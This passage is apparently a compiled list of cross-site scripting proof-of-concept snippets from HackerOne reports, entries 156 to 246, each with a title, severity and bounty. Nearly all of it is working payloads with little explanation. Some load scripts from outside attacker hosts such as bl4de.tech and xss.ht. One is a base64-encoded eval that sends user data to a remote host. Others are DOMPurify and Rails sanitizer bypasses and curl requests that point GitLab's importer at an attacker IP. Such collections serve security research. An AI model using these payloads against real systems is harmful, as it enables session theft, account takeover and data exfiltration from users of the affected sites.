    "repo_id": "523303538",
    "target_namespace": "YOUR_GITLAB_USERNAME",
    "new_name": "xss-on-label-color",
    "github_hostname": "http://YOUR_IP:YOUR_PORT"
}'
```

## 156. [#1665658](https://hackerone.com/reports/1665658)  -  Stored-XSS with CSP-bypass via labels' color
*high*

```bash
curl -kv "https://gitlab.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: AAAAAAAAAAAAAYYYYabc" \
  --data '{
    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "repo_id": "523303538",
    "target_namespace": "yvvdwf",
    "new_name": "xss-on-label-color",
    "github_hostname": "http://51.75.74.52:80"
}'
```

## 157. [#1693150](https://hackerone.com/reports/1693150)  -  Bypass: Stored-XSS with CSP-bypass via scoped labels' color
*high*

```bash
curl -kv "https://gitlab.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: $GL_TOKEN" \
  --data '{
    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "repo_id": "523303538",
    "target_namespace": "yvvdwf-group-a",
    "new_name": "xss-on-label-color",
    "github_hostname": "http://51.75.74.52:11211"
}'
```

## 158. [#1532858](https://hackerone.com/reports/1532858)  -  Cross-site scripting on dashboard2.omise.co
*critical, $200*

```html
<script>alert(2)</script>
```

## 159. [#2039384](https://hackerone.com/reports/2039384)  -  Reflected XSS in https://nin.mtn.ng/nin/success?message=lol&nin=<VULNERABLE>
*critical*

```html
<script>alert(1)</script>
```

## 160. [#309367](https://hackerone.com/reports/309367)  -  [metascraper] Stored XSS in Open Graph meta properties read by metascrapper
*critical*

```html
<script src="http://127.0.0.1:8080/malware.js"></script>
```

## 161. [#309394](https://hackerone.com/reports/309394)  -  [anywhere] An iframe element with url to malicious HTML file (with eg. JavaScript malware) can be used as filename and served via anywhere
*critical*

```html
<script type="text/javascript" src="malware.js"></script>
```

## 162. [#311101](https://hackerone.com/reports/311101)  -  [crud-file-server] Stored XSS in filenames when directory index is served by crud-file-server
*critical*

```html
<script type="text/javascript" src="http://bl4de.tech/poc.js"></script>
```

## 163. [#1805873](https://hackerone.com/reports/1805873)  -  Rails ActionView sanitize helper bypass leading to XSS using SVG tag.
*medium, $2,400*

```ruby
<%= sanitize "<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEzMzcnIGhlaWdodD0nMTMzNyc+CjxpbWFnZSBocmVmPSIxIiBvbmVycm9yPSJhbGVydCh3aW5kb3cub3JpZ2luKSIgLz4KPC9zdmc+#x\"/></svg>", tags: %w(svg use) %>
```

## 164. [#2509022](https://hackerone.com/reports/2509022)  -  Reflected XSS in AI Chat Bot Greetings at help.shopify.com via Markdown Image Rendering
*medium, $1,600*

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shopify Search Form</title>
</head>
<body>
    Please hold...
    
    <form id="post-form" action="https://help.shopify.com/en/search?_data=routes%2F%28%24locale%29.search" method="POST">
        <input type="hidden" name="query" value="Is this XSS?">
        <input type="hidden" name="greeting" value="![Mouse wheel click here for more info...](javascript:eval(atob('ZmV0Y2goYC8v████████/JHtKU09OLnN0cmluZ2lmeSh3aW5kb3cuX19yZW1peENvbnRleHQuc3RhdGUubG9hZGVyRGF0YS5yb290LnVzZXJJbmZvKX1gKTsgZmV0Y2goIi9tZXNzYWdlcy9ncmFwaHFsIiwgeyAiaGVhZGVycyI6IHsgImNvbnRlbnQtdHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwgIngtc2hvcGlmeS1yZWFjdC14aHIiOiAiMSIgfSwgImJvZHkiOiBgeyJ2YXJpYWJsZXMiOnt9LCJxdWVyeSI6InF1ZXJ5IGNvbnZzIHsgY29udmVyc2F0aW9ucyhmaXJzdDogMTAwKSB7IGVkZ2VzIHsgbm9kZSB7IGlkIH0gfSB9IH0ifWAsICJtZXRob2QiOiAiUE9TVCIgfSkgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKSAudGhlbihkYXRhID0+IHsgY29uc3QgY2lkID0gSlNPTi5wYXJzZShkYXRhKS5kYXRhLmNvbnZlcnNhdGlvbnMuZWRnZXNbMF0ubm9kZS5pZCA/PyBudWxsOyBmZXRjaCgiL21lc3NhZ2VzL2dyYXBocWwiLCB7ICJoZWFkZXJzIjogeyAiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL2pzb24iLCAieC1zaG9waWZ5LXJlYWN0LXhociI6ICIxIiB9LCAiYm9keSI6IGB7InZhcmlhYmxlcyI6e30sInF1ZXJ5IjoibXV0YXRpb24gc3Vic2NyaWJlckNyZWF0ZSB7IHN1YnNjcmliZXJDcmVhdGUoY29udmVyc2F0aW9uSWQ6IFxcIiR7Y2lkfVxcIiwgZW1haWw6IFxcInNhbHR5bWVybWFpZEB3ZWFyZWhhY2tlcm9uZS5jb21cXCIpIHsgX190eXBlbmFtZSB9fSJ9YCwgIm1ldGhvZCI6ICJQT1NUIiB9KTsgfSk7')))">
    </form>
    
	<form id="get-form" action="https://help.shopify.com/en/search?_data=routes%2F%28%24locale%29.search" method="GET">
        <input type="hidden" name="q" value="Is this XSS?">
    </form>
    
    <script>
        document.getElementById('post-form').submit();
        setTimeout(() => {
            document.getElementById('get-form').submit();
        },2000);
    </script>
</body>
</html>
# … truncated …
```

## 165. [#3779690](https://hackerone.com/reports/3779690)  -  Stored XSS in Rocket.Chat HTML File Export  -  Unauthenticated Entry via LiveChat
*medium*

```bash
curl -X POST http://TARGET:3000/api/v1/livechat/visitor \
  -H 'Content-Type: application/json' \
  -d '{"visitor":{"name":"Customer","email":"test@test.com","token":"poc-token-001"}}'
```

## 166. [#3779690](https://hackerone.com/reports/3779690)  -  Stored XSS in Rocket.Chat HTML File Export  -  Unauthenticated Entry via LiveChat
*medium*

```bash
curl http://TARGET:3000/api/v1/livechat/room?token=poc-token-001
# Returns: {"room":{"_id":"ROOM_ID",...}}
```

## 167. [#3779690](https://hackerone.com/reports/3779690)  -  Stored XSS in Rocket.Chat HTML File Export  -  Unauthenticated Entry via LiveChat
*medium*

```bash
curl -X POST http://TARGET:3000/api/v1/rooms.export \
  -H 'X-Auth-Token: ADMIN_TOKEN' \
  -H 'X-User-Id: ADMIN_UID' \
  -H 'Content-Type: application/json' \
  -d '{"rid":"ROOM_ID","type":"file","format":"html","dateFrom":"2020-01-01","dateTo":"2030-01-01"}'
```

## 168. [#3606773](https://hackerone.com/reports/3606773)  -  Stored XSS via SVG Upload  -  check_content() Blocklist Bypass & 256-Byte Scan Limit (Self-Propagating Worm)
*medium*

```bash
php poc-svg-xss.php
```

## 169. [#1731349](https://hackerone.com/reports/1731349)  -  Stored XSS via Kroki diagram
*high, $13,950*

```html
<script>alert(document.domain)</script>
```

## 170. [#948929](https://hackerone.com/reports/948929)  -  Blind Stored XSS Via Staff Name
*high, $3,000*

```html
<script>$.getScript("//█████████.xss.ht")</script>
```

## 171. [#249131](https://hackerone.com/reports/249131)  -  Ability to create own account UUID leads to stored XSS
*high, $1,500*

```html
<script src=//is.gd/z0i2sU>&email=[YOUR EMAIL]&brand_pretty_url=ace-wasabis-rock-n-roll-sushi
'''

**Live PoC**
Visit the following page: https://app.upserve.com/b/ace-wasabis-rock-n-roll-sushi?email_token=2aa7296c678e11e7ab2f0242ac110002

The generated HTML looks like:
`YUI.namespace('Env.DATA').consumer = {"uuid":"</script>
```

## 172. [#534450](https://hackerone.com/reports/534450)  -  Account takeover through the combination of cookie manipulation and XSS
*high*

```html
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
```

## 173. [#1256777](https://hackerone.com/reports/1256777)  -  Stored XSS in main page of a project caused by arbitrary script payload in group "Default initial branch name"
*high*

```html
<script src="external_script"></script>
```

## 174. [#1256777](https://hackerone.com/reports/1256777)  -  Stored XSS in main page of a project caused by arbitrary script payload in group "Default initial branch name"
*high*

```html
<script>alert(1);</script>
```

## 175. [#1339034](https://hackerone.com/reports/1339034)  -  Blind XSS via Feedback form.
*high*

```html
<script src=https://yourxssdomain></script>
```

## 176. [#1579645](https://hackerone.com/reports/1579645)  -  XSS: `v-safe-html` is not safe enough
*high*

```html
<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>
```

## 177. [#1212822](https://hackerone.com/reports/1212822)  -  Stored XSS in Mermaid when viewing Markdown files
*high*

```html
<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script>
```

## 178. [#1451394](https://hackerone.com/reports/1451394)  -  POST BASED REFLECTED XSS IN dailydeals.mtn.co.za
*high*

```html
<script>document.forms[0].submit()</script>
```

## 179. [#878145](https://hackerone.com/reports/878145)  -  Blind stored XSS due to insecure contact form at https://www.topcoder.com leads to leakage of session token and other PII
*high*

```html
<script src=https://xvt.xss.ht></script>
```

## 180. [#733222](https://hackerone.com/reports/733222)  -  stored xss in https://www.smule.com
*high*

```html
<script>alert(document.cookie)</script>
```

## 181. [#733222](https://hackerone.com/reports/733222)  -  stored xss in https://www.smule.com
*high*

```html
<script>akert(1)</script>
```

## 182. [#779908](https://hackerone.com/reports/779908)  -  Stored-Xss at connect.topcoder.com/projects/ affected on project chat members
*high*

```html
<script>alert()</script>
```

## 183. [#317125](https://hackerone.com/reports/317125)  -  [bracket-template] Reflected XSS possible when variable passed via GET parameter is used in template
*high*

```html
<script>console.log('XSS?')</script>
```

## 184. [#317125](https://hackerone.com/reports/317125)  -  [bracket-template] Reflected XSS possible when variable passed via GET parameter is used in template
*high*

```html
<script>console.log("uh oh, XSS... :(")</script>
```

## 185. [#349146](https://hackerone.com/reports/349146)  -  Stored XSS in Node-Red
*high*

```html
<script>alert('xss')</script>
```

## 186. [#330356](https://hackerone.com/reports/330356)  -  [html-pages] Stored XSS in the filename when directories listing
*high*

```xml
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Files within nodejs-example/"><svg onload=alert(5);></title>
    <meta name="description" content="">
    <link rel="stylesheet" href="/@html-pages-internal-files-hoihj6ey0qu/css/style.css">
    <link rel="stylesheet" href="/@html-pages-internal-files-hoihj6ey0qu/css/component.css">
    <link rel="stylesheet" href="/@html-pages-internal-files-hoihj6ey0qu/css/loader.css">
    <link rel="icon" type="image/svg+xml" href="/@html-pages-internal-files-hoihj6ey0qu/images/logo.svg">
  </head>

  <body>
    <header>
      <div class="wrapper">
        <nav>
          <ol class="breadcrumb custom-separator">
              <li class="">
                <a class="background-effect" href="/">nodejs-example</a>
              </li>
              <li class="current">
                <span>"><svg onload=alert(5);></span>
              </li>
          </ol>
        </nav>

[...]
```

## 187. [#309648](https://hackerone.com/reports/309648)  -  [simplehttpserver] Stored XSS in file names leads to malicious JavaScript code execution when directory listing is output in HTML
*critical*

```
javascript:alert('You are pwned!')
```

## 188. [#309394](https://hackerone.com/reports/309394)  -  [anywhere] An iframe element with url to malicious HTML file (with eg. JavaScript malware) can be used as filename and served via anywhere
*critical*

```html
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script type="text/javascript" src="malware.js"></script>
</body>

</html>
```

## 189. [#311101](https://hackerone.com/reports/311101)  -  [crud-file-server] Stored XSS in filenames when directory index is served by crud-file-server
*critical*

```html
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script type="text/javascript" src="http://bl4de.tech/poc.js"></script>
</body>

</html>
```

## 190. [#1805899](https://hackerone.com/reports/1805899)  -  CVE-2022-23519: Rails::Html::SafeListSanitizer vulnerable to XSS when certain tags are allowed (math+style || svg+style)
*medium, $2,400*

```
#!/ibn/sh

# make routes
cat << EOF > ./config/routes.rb
Rails.application.routes.draw do
  get "/poc1", to: "poc1#index"
  get "/poc2", to: "poc2#index"
end
EOF

# make Poc1 endpoint
# http://localhost:8888/poc1?name=%3Csvg%3E%3Cstyle%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/style%3E%3Csvg%3E
bin/rails generate controller Poc1 index --skip-routes

cat << EOF > ./app/controllers/poc1_controller.rb
class Poc1Controller < ApplicationController
  def index
    @name = params[:name] || "put your name here"
  end
end
EOF


cat << EOF > ./app/views/poc1/index.html.erb
<h1> Hello <%= sanitize @name, tags: ["svg", "style"] %> </h1>
<br>
PoC with a sanitized, reflected parameter 'name' for which 'svg' annd 'style' tags are allowed.
<br>
<%= link_to "Go to PoC", "/poc1?name=<svg><style><script>alert(1)</script></style><svg>" %>
<br>
<br>
Using: rails-html-sanitizer <%= Rails::Html::Sanitizer::VERSION %>
EOF


# make Poc2 endpoint
# http://localhost:8888/poc2?name=%3Cmath%3E%3Cstyle%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3C/style%3E%3Cmath%3E
bin/rails generate controller Poc2 index --skip-routes

cat << EOF > ./app/controllers/poc2_controller.rb
# … truncated …
```

## 191. [#1805893](https://hackerone.com/reports/1805893)  -  CVE-2022-23520: Incomplete fix for CVE-2022-32209 (XSS in Rails::Html::Sanitizer under certain configurations)
*medium, $2,400*

```html
<script>alert("XSS")</script>
```

## 192. [#2509022](https://hackerone.com/reports/2509022)  -  Reflected XSS in AI Chat Bot Greetings at help.shopify.com via Markdown Image Rendering
*medium, $1,600*

```html
<script>
        document.getElementById('post-form').submit();
        setTimeout(() => {
            document.getElementById('get-form').submit();
        },2000);
    </script>
```

## 193. [#834071](https://hackerone.com/reports/834071)  -  XSS on link and window.opener
*medium, $1,000*

```html
<script>document.pisarenko.submit();</script>
```

## 194. [#632017](https://hackerone.com/reports/632017)  -  Self-Stored XSS - Chained with login/logout CSRF
*medium, $300*

```html
<script>prompt(0,document.domain)</script>
```

## 195. [#1598347](https://hackerone.com/reports/1598347)  -  Stored XSS on www.hackerone.com due to deleted S3-bucket from old page_widget
*medium*

```html
<script id='vspoverlayrun'

codecredit='CopyRight_VSPWorldwide_Productions'
videofolder='hosted'
projectname='vmags43_overlay'
alignvideo='bottommiddle'
offsetx='0'
offsety='0'
waittime='1000'
autoplay='yes'
videowidth='300'
videoheight='480'
videoscale='1'
videoscalemobile='1'
posterscale='0.5'
clickvideo='close'
autodim='0'
autodimcolor='#000000'

src='https://s3.amazonaws.com/vspcode/vspoverlayrun1.js'></script>
```

## 196. [#2279346](https://hackerone.com/reports/2279346)  -  CSP bypass on PortSwigger.net using Google script resources
*medium*

```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
```

## 197. [#1237321](https://hackerone.com/reports/1237321)  -  CSRF to Reflected XSS at echo.urbandictionary.biz via spoofing content type
*medium*

```html
<script>history.pushState('', '', '/')</script>
```

## 198. [#1068477](https://hackerone.com/reports/1068477)  -  RXSS in https://jp.mcafee.com/apps/mdm/jp/3.0_asp/
*medium*

```html
<script language=javascript>
	function onClickBack()
	{
		window.location.replace ("");alert(document.domain);//");
	}
	</script>
```

## 199. [#3606773](https://hackerone.com/reports/3606773)  -  Stored XSS via SVG Upload  -  check_content() Blocklist Bypass & 256-Byte Scan Limit (Self-Propagating Worm)
*medium*

```xml
<svg onload="">
```

## 200. [#806571](https://hackerone.com/reports/806571)  -  Stored XSS in blob viewer
*medium*

```html
<script>alert(0)</script>
```

## 201. [#1196958](https://hackerone.com/reports/1196958)  -  Clipboard DOM-based XSS
*medium*

```html
<script>
        document.oncopy = event => {
            event.preventDefault();
            event.clipboardData.setData('text/x-gfm-html', 'XSS<img/src/onerror=alert(1)>');
            console.log("updated clipboard");
        }
    </script>
```

## 202. [#1247833](https://hackerone.com/reports/1247833)  -  Reflected Cross Site Scripting Cisco ASA on  myvpn.mtncameroon.net CVE-2020-3580
*medium*

```html
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Pragma: no-cache
Connection: Keep-Alive
Date: Wed, 30 Jun 2021 00:59:25 GMT
X-Frame-Options: SAMEORIGIN
Content-Length: 761


<html>
<head>
<script>
function submit_saml() {
    document.cookie = "webvpnlogin=1; path=/; secure";
    document.createElement('form').submit.call(document.getElementById('samlform'));
}
</script>
</head>
<body onload="submit_saml()">
<form id="samlform" action="/+webvpn+/index.html" method="POST">
<input type="hidden" name="tgroup" value="">
<input type="hidden" name="next" value="">
<input type="hidden" name="tgcookieset" value="">
<input type="hidden" name="group_list" value="a">
<input type="hidden" name="username" value="">
<input type="hidden" name="password" value="">
<input type="hidden" name="SAMLResponse" value=""><svg/onload=alert('Renzi')>">
<input type="submit" name="Login" value="Login" style="display:none;">
</form>
</body>
</html>
```

## 203. [#1247833](https://hackerone.com/reports/1247833)  -  Reflected Cross Site Scripting Cisco ASA on  myvpn.mtncameroon.net CVE-2020-3580
*medium*

```html
<script>
function submit_saml() {
    document.cookie = "webvpnlogin=1; path=/; secure";
    document.createElement('form').submit.call(document.getElementById('samlform'));
}
</script>
```

## 204. [#1024734](https://hackerone.com/reports/1024734)  -  DOMPurify bypass
*medium*

```html
<script src="./purify.js"></script>
```

## 205. [#1024734](https://hackerone.com/reports/1024734)  -  DOMPurify bypass
*medium*

```html
<script>
        const html='<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(\'XSS\') src>">';
        const sanitized = DOMPurify.sanitize(html);
        let div = document.createElement('div');
        div.innerHTML = sanitized;
    </script>
```

## 206. [#179695](https://hackerone.com/reports/179695)  -  XSS via unicode characters in upload filename
*medium*

```html
<script> alert('XSS') </script>
```

## 207. [#3399191](https://hackerone.com/reports/3399191)  -  Reflected XSS in account-preferences-plugin.php
*medium*

```html
<ScRiPt >alert(9645)</ScRiPt>
```

## 208. [#1331281](https://hackerone.com/reports/1331281)  -  Stored XSS on 1.4.0
*medium*

```html
<script>alert('AppleBois');</script>
```

## 209. [#395944](https://hackerone.com/reports/395944)  -  Reflected XSS  in the npm module express-cart.
*medium*

```html
<script>alert(1234)</script>
```

## 210. [#775693](https://hackerone.com/reports/775693)  -  Reflected XSS on www/delivery/afr.php
*medium*

```html
<script type='text/javascript'><!--// <![CDATA[
        setTimeout('window.location.replace("http://domain.com/www/delivery/afr.php?refresh=10000&")',10000000);alert(1);setTimeout('alert("&loc=")', 10000000);
    // ]]> --></script>
```

## 211. [#986365](https://hackerone.com/reports/986365)  -  Reflected XSS on /www/delivery/afr.php (bypass of report #775693)
*medium*

```html
<script type='text/javascript'><!--// <![CDATA[
        setTimeout('window.location.replace("https://revive-instance/www/delivery/afr.php?refresh=10000&</script>
```

## 212. [#1069528](https://hackerone.com/reports/1069528)  -  Reflected XSS on gamesclub.mtn.com.g
*medium*

```html
<ScRiPt >gQmT(9082)</ScRiPt>
```

## 213. [#495515](https://hackerone.com/reports/495515)  -  Reflected XSS: Taxonomy Converter via tax parameter
*medium*

```html
<script>
          document.forms[0].submit();
        </script>
```

## 214. [#2037234](https://hackerone.com/reports/2037234)  -  Stored XSS + CSRF in "apellido" value
*medium*

```html
<script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
```

## 215. [#355458](https://hackerone.com/reports/355458)  -  [statics-server] XSS via injected iframe in file name when statics-server displays directory index in the browser
*medium*

```html
<script>
        alert('Uh oh, I am bad, bad malware!!!')
    </script>
```

## 216. [#463380](https://hackerone.com/reports/463380)  -  [webpack-bundle-analyzer] Cross-site Scripting
*medium*

```html
<script>alert(1)<
│       └── script>module-name-that-is-included-in-index.js
├── index.js
└── package.json
'''

will result in something like this:
'''javascript
<script>
    window.chartData = [
{"some-data-here":
"and here</script>
```

## 217. [#789652](https://hackerone.com/reports/789652)  -  Reflected-XSS on https://www.topcoder.com/tc via pt parameter
*medium*

```html
<script>confirm(1)</script>
```

## 218. [#374100](https://hackerone.com/reports/374100)  -  Reflected xss in Serendipity's /index.php
*medium*

```html
<ScRiPt >prompt(1)</ScRiPt>
```

## 219. [#472391](https://hackerone.com/reports/472391)  -  Stored XSS @ /engage/<project_slug>
*medium*

```html
<script src="http://<adversery_domain>/payload.js"></script>
```

## 220. [#616770](https://hackerone.com/reports/616770)  -  Stored XSS in Conversations (both client and admin) when Active Conversation Editor is set to "Rich Text"
*medium*

```html
<script>` tag and JavaScript payload "as-is" in database

- put following payload in comment field:

`<script src="http://bl4de.tech/poc.js"></script>
```

## 221. [#356809](https://hackerone.com/reports/356809)  -  [exceljs] Possible XSS via cell value when worksheet is displayed in browser
*medium*

```javascript
'use strict'
/*global console*/
const Excel = require('exceljs')
const http = require('http')
const port = 8080

const workbook = new Excel.Workbook()
const filename = 'testsheet.xlsx'

function createHTML(worksheet) {
    let __html = `
    <table>
        <tr>
            <td>${worksheet.getCell('A1').value}</td>
            <td>${worksheet.getCell('A2').value}</td>
            <td>${worksheet.getCell('A3').value}</td>
        </tr>
        <tr>
            <td>${worksheet.getCell('B1').value}</td>
            <td>${worksheet.getCell('B2').value}</td>
            <td>${worksheet.getCell('B3').value}</td>
        </tr>
    </table>
    `

    return __html
}

const requestHandler = (request, response) => {
    workbook.xlsx.readFile(filename)
        .then(worksheets => {
            worksheets.eachSheet(function(worksheet, sheetId) {
                response.writeHeader(200, {
                    "Content-Type": "text/html"
                })
                response.write(createHTML(worksheet))
                response.end()
            });
        });
}
# … truncated …
```

## 222. [#373950](https://hackerone.com/reports/373950)  -  Reflected Cross-Site Scripting in Serendipity (serendipity.SetCookie)
*medium*

```html
<script type="text/javascript">serendipity.SetCookie("' . $name . '", unescape("' . $value . '"))</script>
```

## 223. [#395734](https://hackerone.com/reports/395734)  -  XSS in Subdomain of DuckDuckGo
*medium*

```html
<script>alert(document.domain);</script>
```

## 224. [#1731349](https://hackerone.com/reports/1731349)  -  Stored XSS via Kroki diagram
*high, $13,950*

```html
<a>
    <pre lang='/" data-diff-for-path=/root/kroki1/-/snippets/9/raw/main/aaa.json '>
        <code lang="wavedrom">csp</code>
    </pre>
    <pre
        lang='/" id=stage1 style="position:absolute;max-width:10000px;left:-1000px;top:-1000px;width:10000px;height:10000px;z-index:10000;" data-triggers="click" data-toggle=popover data-html=true data-title="aaa&lt;style&gt;#stage1{pointer-events:none}svg.chevron-right{position:absolute;max-width:10000px;left:-1000px;top:-1000px !important;width:10000px;height:10000px;z-index:10001;}&lt;/style&gt;bbb" data-content=ggg '>
    <code lang="wavedrom">
    bypass
    </code>
    </pre>
</a>
```

## 225. [#232174](https://hackerone.com/reports/232174)  -  XSS on $shop$.myshopify.com/admin/ and partners.shopify.com via whitelist bypass in SVG icon for sales channel applications
*high, $5,000*

```
/admin/oauth/authorize?client_id=672a937d5eb24e10c756ea256c73bb8c&scope=read_products&redirect_uri=https://attackerdoma.in/93ba4bef-cff1-43b1-922d-0631bd387e2e.html&state=nonce
```

## 226. [#836649](https://hackerone.com/reports/836649)  -  Stored XSS in markdown when redacting references
*high, $5,000*

```markdown
link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">xss &lt;img onerror=alert(1) src=x></a>
```

## 227. [#836649](https://hackerone.com/reports/836649)  -  Stored XSS in markdown when redacting references
*high, $5,000*

```html
<div class="md"><p data-sourcepos="1:1-1:124" dir="auto">link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1">xss <img onerror="alert(1)" src="x"></a></p></div>
```

## 228. [#836649](https://hackerone.com/reports/836649)  -  Stored XSS in markdown when redacting references
*high, $5,000*

```markdown
link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">csp 
&lt;a 
  data-remote=&quot;true&quot;
  data-method=&quot;get&quot;
  data-type=&quot;script&quot;
  href=/wbowling/wiki/raw/master/test.js
  class='atwho-view select2-drop-mask pika-select'
&gt;
  &lt;img height=10000 width=10000&gt;
&lt;/a&gt;
</a>
```

## 229. [#508184](https://hackerone.com/reports/508184)  -  Persistent XSS in Note objects
*high, $4,500*

```
"notes": [
        {
          "id": 1,
          "note": "interesting note here",
          "note_html": "<img src=\"test\" onerror=\"alert(document.domain)\"></img>html overwritten",
          "cached_markdown_version": 917504,
```

## 230. [#946728](https://hackerone.com/reports/946728)  -  SafeParamsHelper::safe_params is not so safe
*high, $4,000*

```html
<a class="btn btn-svg has-tooltip" data-container="body" title=""  href="javascript:alert(1)//vakzz-h1/redirect1/-/issues.atom?feed_token=XXXX&amp;state=opened" data-original-title="Subscribe to RSS feed">
  <svg class="s16 qa-rss-icon" data-testid="rss-icon">
    <use xlink:href="https://gitlab.com/assets/icons-37f758fe6359f04ae912169432d8ddd9dd45a1316d8fa634996c10bd033e9726.svg#rss"></use>
  </svg>
</a>
```

## 231. [#723307](https://hackerone.com/reports/723307)  -  Stored XSS in merge request pages
*high, $3,500*

```bash
touch 1.txt
    git add 1.txt
    git commit -m "initial commit"
    git push origin master
    
    git checkout -b "<img/src='x'/onerror=alert(document.domain)>"
    touch 2.txt
    git add 2.txt
    git commit -m "add 2.txt"
    git push origin "<img/src='x'/onerror=alert(document.domain)>"
    
    git checkout master
    touch 3.txt
    git add 3.txt
    git commit -m "add 3.txt"
    git push origin master
```

## 232. [#1198517](https://hackerone.com/reports/1198517)  -  Stored XSS in custom emoji
*high, $3,000*

```
mutation {
  createCustomEmoji(input: 
    {
      groupPath: "xss_target", 
      name:"xssreplace",
      url:"http://aaa#'><img onerror=alert(location) src=.>"
    }) {
    customEmoji {
      id
      name
      url
    }
  }
}
```

## 233. [#856554](https://hackerone.com/reports/856554)  -  Stored XSS on the job page
*high, $3,000*

```
deploy:
      stage: deploy
      script:
        - echo "Example"
      environment:
        name: production
        url: https://google.com
        kubernetes:
          namespace: <img src=x onerror=alert(1)>
      only:
      - master
```

## 234. [#1398305](https://hackerone.com/reports/1398305)  -  Stored XSS on issue comments and other pages which contain notes
*high, $3,000*

```html
<pre data-sourcepos="&#34; href=&#34;x&#34;></pre>
<gl-emoji data-name='&#34;x=&#34y&#34 onload=&#34;alert(document.location.href)&#34;' data-unicode-version='x'>
abc
</gl-emoji>
<pre x=&#34;">
<code></code></pre>
```

## 235. [#1103258](https://hackerone.com/reports/1103258)  -  Stored DOM XSS via Mermaid chart
*high, $3,000*

```
%%{init: { 'fontFamily': '\"></style><img src=x onerror=alert(document.cookie)>'} }%%
```

## 236. [#1103258](https://hackerone.com/reports/1103258)  -  Stored DOM XSS via Mermaid chart
*high, $3,000*

```
%%{init: { 'fontFamily': '\"></style><img src=x onerror=alert(document.cookie)>'} }%%
sequenceDiagram
Alice->>Bob: Hi Bob
Bob->>Alice: Hi Alice
```

## 237. [#709336](https://hackerone.com/reports/709336)  -  Reflective Cross-site Scripting via Newsletter Form
*high, $2,000*

```
https://testbuguser.myshopify.com/?contact[email]%20onfocus%3djavascript:alert(%27xss%27)%20autofocus%20a=a&form_type[a]aaa
```

## 238. [#846905](https://hackerone.com/reports/846905)  -  Stored XSS in Elastic App Search
*high, $2,000*

```json
{
"url":"javascript://test%0aalert(document.domain)"
}
```

## 239. [#1404804](https://hackerone.com/reports/1404804)  -  Email templates XSS by filterXSS bypass
*high, $1,250*

```html
<![endif]-- onerror="<![endif]-->" onload="<img src=1 onerror='alert(1)' />">
```

## 240. [#1887917](https://hackerone.com/reports/1887917)  -  XSS from Mastodon embeds
*high, $500*

```json
{
  "account": {
    "url": "https://sm4.ca/@a"
  },
  "url": "javascript:top.document.body.innerHTML = \"hi your cookie is \" + document.cookie;//"
}
```

## 241. [#2010530](https://hackerone.com/reports/2010530)  -  yelp.com XSS ATO (via login keylogger, link Google account)
*high*

```
Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Domain=.yelp.com; Path=/; Secure;
```

## 242. [#2010530](https://hackerone.com/reports/2010530)  -  yelp.com XSS ATO (via login keylogger, link Google account)
*high*

```
Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Max-Age=99999999; Domain=.yelp.com; Path=/; Secure; SameSite=Lax
```

## 243. [#422043](https://hackerone.com/reports/422043)  -  H1514 DOMXSS on Embedded SDK via Shopify.API.setWindowLocation abusing cookie Stuffing
*high*

```javascript
$$('iframe')[0].contentWindow.postMessage('{"message":"Shopify.API.setWindowLocation","data":"javascript:alert(document.domain);0[0]"}','*')
```

## 244. [#1542510](https://hackerone.com/reports/1542510)  -  XSS in ZenTao integration affecting self hosted instances without strict CSP
*high*

```json
{
   "id": "<img src=# height=10000 width=10000>",
   "url": "javascript:alert(document.domain)"
}
```

## 245. [#1542510](https://hackerone.com/reports/1542510)  -  XSS in ZenTao integration affecting self hosted instances without strict CSP
*high*

```json
{
    "issue": {
        "id": "<img src=# height=10000 width=10000>",
        "title": "Attack",
        "labels": [],
        "pri": 3,
        "openedDate": "2021-08-10T08:25:18Z",
        "openedBy": {
            "id": 1,
            "account": "asd",
            "realname": "admin",
            "avatar": "https://www.gravatar.com/avatar/21232f297a57a5a743894a0e4a801fc3?d=identicon&s=80",
            "url": "https://example.com"
        },
        "lastEditedDate": "2021-08-10T08:25:18Z",
        "lastEditedBy": "asd",
        "status": "asd",
        "url": "javascript:alert(document.domain)",
        "desc": "description",
        "assignedTo": [],
        "comments": []
    }
}
```

## 246. [#509930](https://hackerone.com/reports/509930)  -  Potential unprivileged Stored XSS through wp_targeted_link_rel
*high*

```
function wp_targeted_link_rel_callback( $matches ) {
